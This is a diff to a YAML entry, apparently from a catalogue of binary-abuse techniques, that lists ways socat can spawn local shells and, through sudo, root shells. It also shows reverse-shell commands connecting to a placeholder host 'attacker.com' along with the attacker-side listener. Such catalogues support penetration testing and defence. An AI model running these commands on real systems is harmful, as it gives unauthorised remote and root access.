@@ -1,5 +1,8 @@
 ---
 functions:
+  shell:
+    - code: |
+        socat STDIN EXEC:/bin/bash
   reverse-shell:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
@@ -17,10 +20,6 @@ functions:
         RHOST=attacker.com
         RPORT=12345
         sudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
-  sudo-target-only:
-    - description: Run ``socat STDIN EXEC:/bin/bash`` on the target box to forward all STDIN directly to bash as root
-      code: |
-        sudo socat STDIN EXEC:/bin/bash
   limited-suid:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
